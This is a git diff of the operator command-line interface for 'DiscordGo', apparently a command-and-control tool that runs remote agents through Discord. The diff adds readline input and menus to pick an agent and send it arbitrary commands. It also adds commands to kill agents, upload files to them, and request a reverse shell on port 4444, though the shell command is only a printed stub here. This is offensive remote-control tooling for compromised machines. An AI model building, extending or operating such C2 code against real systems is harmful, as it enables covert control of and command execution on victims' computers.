@@ -3,93 +3,144 @@ package cli
 import (
 	"DiscordGo/pkg/agents"
 	"DiscordGo/pkg/message"
-	"bufio"
 	"fmt"
+	"io"
 	"os"
 	"strings"
 
 	"github.com/bwmarrin/discordgo"
+	"github.com/chzyer/readline"
 	"github.com/olekukonko/tablewriter"
 )
+
+var Prompt *readline.Instance
+
+// Taking from their example
+func filterInput(r rune) (rune, bool) {
+	switch r {
+	// block CtrlZ feature
+	case readline.CharCtrlZ:
+		return r, false
+	}
+	return r, true
+}
 
 //TODO: Ascii art
 // Shell is start of the command line mode
 func Shell(dg *discordgo.Session) {
-	prompt := "DiscordGo>>> "
 	promtpState := "main"
 	focusedAgent := ""
 
-	for {
-		fmt.Print(prompt)
+	// Setting up command prompt with another package
+	// because golang just sucks
+	// Also with these, I get history file
+	readlinePrompt, err := readline.NewEx(&readline.Config{
+		Prompt:      "\033[31mDiscordGo>>> \033[0m",
+		HistoryFile: "/tmp/readline.tmp",
+		// AutoComplete:    completer,
+		InterruptPrompt: "^C",
+		EOFPrompt:       "exit",
 
-		consoleReader := bufio.NewReader(os.Stdin)
-		command, _ := consoleReader.ReadString('\n')
-		cmd := strings.Fields(command)
-	
-		switch promtpState {
-		case "main":
-			// fmt.Println("main menu")
-			switch cmd[0] {
-			case "help":
-				mainMenuHelp()
-			case "exit":
-				fmt.Println("Exiting.")
-				os.Exit(0)
-			case "interact":
-				if len(cmd) > 1 {
-					// if uuid is given, check if that UUID exist
-					if agents.DoesAgentExist(cmd[1]) {
-						focusedAgent = cmd[1]
-						prompt = "DiscordGo[" + cmd[1] + "]>> " // TODO: Need to shorten the UUID
-						promtpState = "agent"
-					} else{
-						fmt.Println("Agent: " + cmd[1] + " does not exist")
-					}
-				} else {
-					// if no uuid is provided, say id needs to provided
-					fmt.Println("You need to provide an agent ID")
-				}
-			case "agents":
-				listAgents()
+		HistorySearchFold: true,
+		FuncFilterInputRune: filterInput,
+	})
+
+	// Doing this so I can change the prompt later on
+	Prompt = readlinePrompt
+
+	if err != nil {
+		panic(err)
+	}
+	defer readlinePrompt.Close()
+
+	for {
+		command, _ := readlinePrompt.Readline()
+		if err == readline.ErrInterrupt {
+			if len(command) == 0 {
+				break
+			} else {
+				continue
 			}
-		case "agent":
-			switch cmd[0] {
-			case "exit" :
-				fmt.Println("Exiting....")
-				os.Exit(0)
-			case "help":
-				fmt.Println("Help menu")
-				agentMenuHelp()
-			case "back":
-				prompt = "DiscordGo>>> "
-				promtpState = "main"
-			case "cmd":
-				if len(cmd) > 1 {
-					fmt.Println("command: " + cmd[1])
-					fmt.Println("Target: " + focusedAgent)
-					message.CommandMessage(dg, focusedAgent, cmd[1])
-				} else{
-					fmt.Println("Please provide the command you need executed")
+		} else if err == io.EOF {
+			break
+		}
+		command = strings.TrimSpace(command)
+		cmd := strings.Fields(command)
+
+		if len(cmd) > 0 {
+			switch promtpState {
+			case "main":
+				switch cmd[0] {
+				case "help":
+					mainMenuHelp()
+				case "exit":
+					fmt.Println("Exiting.")
+					os.Exit(0)
+				case "interact":
+					if len(cmd) > 1 {
+						// if uuid is given, check if that UUID exist
+						if agents.DoesAgentExist(cmd[1]) {
+							focusedAgent = cmd[1]
+							// TODO: Fix color scheme
+							Prompt.SetPrompt("DiscordGo[" + cmd[1] + "]>> ")// TODO: Need to shorten the UUID
+							promtpState = "agent"
+						} else {
+							fmt.Println("Agent: " + cmd[1] + " does not exist")
+						}
+					} else {
+						// if no uuid is provided, say id needs to provided
+						fmt.Println("You need to provide an agent ID")
+					}
+				case "agents":
+					listAgents()
 				}
-			case "shell":
-				fmt.Println("sending a shell to you on port 4444")
-			case "ping":
-				message.Ping(dg, focusedAgent)
-			case "kill":
-				// 
+			case "agent":
+				switch cmd[0] {
+				case "exit":
+					fmt.Println("Exiting....")
+					os.Exit(0)
+				case "help":
+					fmt.Println("Help menu")
+					agentMenuHelp()
+				case "back":
+					Prompt.SetPrompt("\033[31mDiscordGo>>> \033[0m")
+					promtpState = "main"
+				case "cmd":
+					if len(cmd) > 1 {
+						fmt.Println("command: ")
+						fmt.Println(cmd[1:])
+						fmt.Println("Target: " + focusedAgent)
+						finalCmd := ""
+						for _, precmd := range cmd{
+							finalCmd += precmd + " "
+						}
+						finalCmd = strings.TrimSpace(finalCmd)
+						message.CommandMessage(dg, focusedAgent, finalCmd)
+					} else {
+						fmt.Println("Please provide the command you need executed")
+					}
+				case "shell":
+					fmt.Println("sending a shell to you on port 4444")
+				case "ping":
+					message.Ping(dg, focusedAgent, true)
+				case "kill":
+					//
+					message.KillAgent(dg, focusedAgent)
+				case "agents":
+					listAgents()
+				}
 			}
 		}
 	}
 }
 
-func mainMenuHelp(){
+func mainMenuHelp() {
 	table := tablewriter.NewWriter(os.Stdout)
-	tableData:= [][]string{
+	tableData := [][]string{
 		{"help", "Display this menu"},
 		{"exit", "Exiting the server"},
 		{"interact <UUID>", "Something something with agent"},
 		{"agents", "List all the connected agents"},
-		
 	}
 
 	table.SetHeader([]string{"Command", "Description"})
@@ -97,9 +148,10 @@ func mainMenuHelp(){
 	table.Render()
 }
 
-func agentMenuHelp(){
+// TODO: send command to all agents
+func agentMenuHelp() {
 	table := tablewriter.NewWriter(os.Stdout)
-	tableData:= [][]string{
+	tableData := [][]string{
 		{"help", "Display this menu"},
 		{"exit", "Exiting the server"},
 		{"kill", "stop/remove the agent"},
@@ -107,6 +159,8 @@ func agentMenuHelp(){
 		{"shell", "send a reverse shell to us"},
 		{"ping", "check if the agent is alive"},
 		{"back", "Return back to main menu"},
+		{"agents", "List all the connected agents"},
+		{"fileupload <source> <destination>", "Upload files to an agent"},
 	}
 
 	table.SetHeader([]string{"Command", "Description"})
@@ -129,7 +183,7 @@ func listAgents() {
 		data = append(data, agent.Status)
 		// TODO: Add another column to tell when last heard from server
 
-		if agent.Status == "alive"{
+		if agent.Status == "alive" {
 			table.SetColumnColor(tablewriter.Colors{},
 				tablewriter.Colors{},
 				tablewriter.Colors{},
